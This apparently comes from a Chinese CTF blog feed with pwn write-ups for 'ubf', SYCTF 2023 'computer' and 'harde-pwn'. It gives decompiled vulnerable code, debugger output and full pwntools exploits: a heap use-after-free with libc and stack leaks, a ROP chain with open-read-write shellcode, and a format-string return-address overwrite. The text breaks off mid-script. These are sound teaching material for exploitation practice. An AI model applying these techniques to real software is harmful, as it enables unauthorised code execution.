&amp;string-&gt;mem[string-&gt;offset];            &#x2F;&#x2F; vuln  v1 &#x3D; &amp;string-&gt;mem[string-&gt;size];  for ( i &#x3D; 0; i &lt; string-&gt;len &amp;&amp; &amp;v2[i] &lt; v1; ++i )    v2[i] &#x3D; v2[i] !&#x3D; 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> base64 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ubf"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b's'</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"$FLAG"</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">126</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubf </tag>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-syctf-pwn复现</title>
      <link href="/2023/08/10/2023-syctf-pwn-fu-xian/2023syctf-computer-fu-xian/"/>
      <url>/2023/08/10/2023-syctf-pwn-fu-xian/2023syctf-computer-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="computer"><a href="#computer" class="headerlink" title="computer"></a>computer</h2><p>本题模拟了计算机的一些操作，本质上还是一些<code>2.27</code>堆的<code>add delete show</code>操作</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 __fastcall op(__int64 *a1, __int64 a2, __int64 a3, const char **a4)&#123;  __isoc99_sscanf(a2, &quot;%256s %256s&quot;, command, argument);  ...  if ( !strcmp(command, &quot;touch&quot;) )              &#x2F;&#x2F; add  &#123;    if ( (*(_DWORD *)(*a1 + 48) &amp; 2) !&#x3D; 0 )    &#123;      str &#x3D; add(argument, 0, *a1, 6);      add_list(*a1, (__int64)str);      return __readfsqword(0x28u) ^ v25;    &#125;    goto LABEL_107;  &#125;  if ( !strcmp(command, &quot;exec&quot;) )               &#x2F;&#x2F; add  &#123;    for ( i &#x3D; *(_QWORD *)(*a1 + 32); i; i &#x3D; *(_QWORD *)(i + 40) )    &#123;      if ( !*(_DWORD *)(i + 8) &amp;&amp; !strcmp(*(const char **)i, argument) )      &#123;        if ( !strcmp(*a4, &quot;root&quot;) || (*(_DWORD *)(i + 48) &amp; 4) !&#x3D; 0 &amp;&amp; pid_count &lt;&#x3D; 15 )        &#123;          count &#x3D; pid_count;          pid_list[count] &#x3D; (pid *)malloc(0x10uLL);          LODWORD(pid_list[pid_count]-&gt;pid) &#x3D; pid_count;          pid_ &#x3D; pid_list[pid_count];          pid_-&gt;name &#x3D; (__int64)strdup(argument);          ++pid_count;          puts(aExecOver);          return __readfsqword(0x28u) ^ v25;        &#125;        goto LABEL_107;      &#125;    &#125;  &#125;  ...  else if ( !strcmp(command, &quot;ps&quot;) )            &#x2F;&#x2F; show  &#123;    atoi(argument);    puts(&quot;pid:\tname:&quot;);    for ( index &#x3D; 0; index &lt; pid_count; ++index )    &#123;      if ( pid_list[index] )        printf(&quot;%d\t%s\n&quot;, LODWORD(pid_list[index]-&gt;pid), (const char *)pid_list[index]-&gt;name);    &#125;  &#125;  else if ( !strcmp(command, &quot;kill&quot;) )          &#x2F;&#x2F; free  &#123;    pid &#x3D; atoi(argument);    if ( pid &gt;&#x3D; 0 &amp;&amp; pid &lt;&#x3D; pid_count )    &#123;      free((void *)pid_list[pid]-&gt;name);      free(pid_list[pid]);                      &#x2F;&#x2F; uaf      --pid_count;      printf(&quot;%d had been killed\n&quot;, (unsigned int)pid);    &#125;  &#125;  else if ( !strcmp(command, &quot;rm&quot;) )            &#x2F;&#x2F; free  &#123;    if ( (*(_DWORD *)(*a1 + 48) &amp; 2) &#x3D;&#x3D; 0 )      goto LABEL_107;    v15 &#x3D; 0LL;    for ( n &#x3D; *(_QWORD *)(*a1 + 32); n; n &#x3D; *(_QWORD *)(n + 40) )    &#123;      if ( !strcmp(*(const char **)n, argument) )      &#123;        if ( v15 )          *(_QWORD *)(v15 + 40) &#x3D; *(_QWORD *)(n + 40);        else          *(_QWORD *)(*a1 + 32) &#x3D; *(_QWORD *)(n + 40);        *(_QWORD *)(n + 40) &#x3D; 0LL;        sub_2CE0(n);        return __readfsqword(0x28u) ^ v25;      &#125;      v15 &#x3D; n;    &#125;  &#125;  ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>kill</code>会释放由<code>exec</code>创建的堆，<code>rm</code>会释放掉由<code>touch</code>创建的文件，<code>ps</code>会输出<code>exec</code>创建的堆，<code>kill</code>指令中存在<code>uaf</code>漏洞</p><p>程序开了沙箱保护，不能直接<code>getshell</code>，只能将返回地址改成<code>orw</code>指令</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">➜  computer seccomp-tools dump .&#x2F;pwn line  CODE  JT   JF      K&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch 0001: 0x15 0x00 0x02 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A !&#x3D; execve) goto 0005 0004: 0x06 0x00 0x00 0x00030000  return TRAP 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一步就是泄露<code>libc</code>地址、栈地址,由于存在<code>uaf</code>漏洞所以直接创建一个<code>unsorted bin</code>即可泄露<code>libc</code>地址，再将<code>fd</code>改成<code>environ</code>即可泄露栈地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'touch '</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xe7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'exec '</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xe7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">'touch '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">'kill '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#fill up tcache</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'ps'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>     <span class="token comment">#leak libc</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'touch '</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3ee098</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#environ</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'ps'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'name:\n'</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x660</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\t'</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就是改返回地址为<code>orw</code>，利用<code>uaf</code>改堆的<code>fd</code>为函数的返回地址，再将堆都申请出来即可申请到返回地址</p><p>exp:</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;pwn&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 0if debug:    r &#x3D; remote()else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)def dbg():    gdb.attach(r)r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;a&#39; * 0xe7)for i in range(16):    r.sendlineafter(b&#39;&gt; &#39;, b&#39;exec &#39; + b&#39;a&#39; * 0xe7)for i in range(10):    r.sendlineafter(b&#39;&gt; &#39;, &#39;touch &#39; + str(i))for i in range(8)[::-1]:    r.sendlineafter(b&#39;&gt; &#39;, &#39;kill &#39; + str(i))    #fill up tcacher.sendlineafter(b&#39;&gt; &#39;, b&#39;ps&#39;)libc_base &#x3D; u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 0x3ebca0     #leak libcr.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;b&#39; * 8 + p64(libc_base + 0x3ee098))    #environr.sendlineafter(b&#39;&gt; &#39;, b&#39;ps&#39;)r.recvuntil(b&#39;name:\n&#39;)heap_base &#x3D; u64(r.recvuntil(b&#39;\n&#39;)[2:8].ljust(8, b&#39;\x00&#39;)) - 0x660r.recvuntil(b&#39;\t&#39;)stack_addr &#x3D; u64(r.recvuntil(b&#39;\n&#39;)[:6].ljust(8, b&#39;\x00&#39;))r.sendlineafter(b&#39;&gt; &#39;, b&#39;rm 0&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;rm 1&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;kill 0&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;mkdir new&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;cd new&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch 0&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch 1&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch 2&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + p64(stack_addr - 0xb28))r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;3&#39; * 0x19)p &#x3D; flat([libc_base + 0x000000000002164f, (stack_addr - 0xb28) &amp; (~0xfff),          libc_base + 0x0000000000023a6a, 0x1000, libc_base + 0x0000000000001b96,          7, libc_base + 0x000000000001b500, 10 + 0x10, libc_base + 0x000000000009a872,          libc_base + 0x00000000000d2625, libc_base + 0x0000000000002b25])p +&#x3D; asm(&#39;&#39;&#39;    mov eax, 0x67616c66 ;&#x2F;&#x2F; flag    push rax    mov rdi, rsp    xor eax, eax    mov esi, eax    mov al, 2    syscall ;&#x2F;&#x2F; open    push rax    mov rsi, rsp    xor eax, eax    mov edx, eax    inc eax    mov edi, eax    mov dl, 8    syscall ;&#x2F;&#x2F; write open() return value    pop rax    test rax, rax    js over    mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;&#x2F;&#x2F; read    mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;&#x2F;&#x2F; writeover:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;&#x2F;&#x2F; exit&#39;&#39;&#39;)r.sendlineafter(b&#39;&gt; &#39;, b&#39;touch &#39; + b&#39;c&#39; * 8 + p64(libc_base + 0x00000000000baf9c) + b&#39;a&#39; * 218 + p)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="harde-pwn"><a href="#harde-pwn" class="headerlink" title="harde-pwn"></a>harde-pwn</h2><p>首先需要通过一个<code>game</code>，通过溢出改<code>seed = 0</code>，然后联合<code>C</code>编程计算随机数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_DWORD *fuxk_game()&#123;  _DWORD *result; &#x2F;&#x2F; rax  char buf[28]; &#x2F;&#x2F; [rsp+0h] [rbp-40h] BYREF  __int64 seed; &#x2F;&#x2F; [rsp+1Ch] [rbp-24h]  int v3; &#x2F;&#x2F; [rsp+24h] [rbp-1Ch] BYREF  int v4; &#x2F;&#x2F; [rsp+28h] [rbp-18h]  int i; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]  puts(&quot;Welcome to a ctype game!&quot;);  seed &#x3D; randomm();  read(0, buf, 0x20uLL);  srand(seed);  for ( i &#x3D; 0; i &lt;&#x3D; 20; ++i )  &#123;    v4 &#x3D; (rand() ^ 0x24) + 1;    puts(&quot;input: &quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v3);    if ( v4 !&#x3D; v3 )    &#123;      puts(&quot;fuxk up!&quot;);      exit(1);    &#125;    puts(&quot;Success!&quot;);  &#125;  result &#x3D; &amp;is_fmt;  is_fmt &#x3D; 1;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着进入一个无限次堆上的格式化字符串函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void __noreturn heap_fmt()&#123;  char *ptr; &#x2F;&#x2F; [rsp+8h] [rbp-8h]  for ( ptr &#x3D; 0LL; ; printf(ptr) )  &#123;    ptr &#x3D; (char *)realloc(ptr, 0x1000uLL);    my_write(&quot;input your data ;)\n&quot;);    read(0, ptr, 0x1000uLL);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为<code>got</code>表不可写且<code>for</code>是死循环，所以需要改<code>printf</code>的返回地址最终运行到<code>ogg</code></p><pre class="line-numbers language-none"><code class="language-none">► 0x7ffff7c6082f &lt;printf+191&gt;             add    rsp, 0xd8  0x7ffff7c60836 &lt;printf+198&gt;             ret    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>返回地址是<code>rsp</code>，并且在原本的地址上加了<code>0xd8</code>，因此将<code>rsp+0xd8</code>的地方改成<code>__libc_csu_init+97</code>，因为地址位数相差过大不能直接改<code>ogg</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; stack00:0000│ rsp 0x7fffffffdd60 ◂— 0x300000001001:0008│     0x7fffffffdd68 —▸ 0x7fffffffde40 ◂— 0x002:0010│     0x7fffffffdd70 —▸ 0x7fffffffdd80 ◂— 0x103:0018│     0x7fffffffdd78 ◂— 0x9d5edc9b23af520004:0020│     0x7fffffffdd80 ◂— 0x105:0028│     0x7fffffffdd88 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;06:0030│     0x7fffffffdd90 ◂— 0x100007:0038│     0x7fffffffdd98 —▸ 0x7ffff7d14992 (read+18) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;pwndbg&gt; 08:0040│  0x7fffffffdda0 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;09:0048│  0x7fffffffdda8 ◂— 0x00a:0050│  0x7fffffffddb0 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;0b:0058│  0x7fffffffddb8 ◂— 0x10000c:0060│  0x7fffffffddc0 —▸ 0x55555555b290 ◂— 0x00d:0068│  0x7fffffffddc8 ◂— 0x10100e:0070│  0x7fffffffddd0 ◂— 0x10100f:0078│  0x7fffffffddd8 —▸ 0x7ffff7ca5989 (realloc+457) ◂— mov    r8, raxpwndbg&gt; 10:0080│  0x7fffffffdde0 ◂— 0x100011:0088│  0x7fffffffdde8 ◂— 0xff12:0090│  0x7fffffffddf0 —▸ 0x555555555502 (main) ◂— endbr64 13:0098│  0x7fffffffddf8 ◂— 0x014:00a0│  0x7fffffffde00 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f15:00a8│  0x7fffffffde08 —▸ 0x555555555365 (my_write+55) ◂— nop    16:00b0│  0x7fffffffde10 —▸ 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r1017:00b8│  0x7fffffffde18 —▸ 0x55555555604b ◂— &#39;input your data ;)\n&#39;pwndbg&gt; 18:00c0│     0x7fffffffde20 —▸ 0x555555555502 (main) ◂— endbr64 19:00c8│     0x7fffffffde28 ◂— 0x131a:00d0│     0x7fffffffde30 —▸ 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r101b:00d8│     0x7fffffffde38 —▸ 0x5555555555b1 (__libc_csu_init+97) ◂— pop    rsi1c:00e0│     0x7fffffffde40 ◂— 0x01d:00e8│     0x7fffffffde48 —▸ 0x55555555b2a0 ◂— &#39;%177c%45$hhn&#39;1e:00f0│ rbp 0x7fffffffde50 —▸ 0x7ffff7cebcf5 (execvpe+1141) ◂— mov    rsi, r101f:00f8│     0x7fffffffde58 —▸ 0x555555555543 (main+65) ◂— mov    eax, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从<code>__libc_csu_init</code>的返回地址是<code>rsp</code>，所以事先将<code>rbp</code>改成<code>ogg</code>，再利用<code>__libc_csu_init+97</code>的两次<code>ret</code>将<code>rsp</code>移到<code>rbp</code>，<code>ret</code>到<code>ogg</code></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>seed <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x20</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Welcome to a ctype game!'</span><span class="token punctuation">,</span> seed<span class="token punctuation">)</span>seed <span class="token operator">=</span> <span class="token number">0</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">b'%8$p%11$p%7$p'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x29d90</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2a0</span>ret <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">8</span>ptr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x18</span>rbp <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x10</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a37</span><span class="token punctuation">,</span> <span class="token number">0xebcf1</span><span class="token punctuation">,</span> <span class="token number">0xebcf5</span><span class="token punctuation">,</span> <span class="token number">0xebcf8</span><span class="token 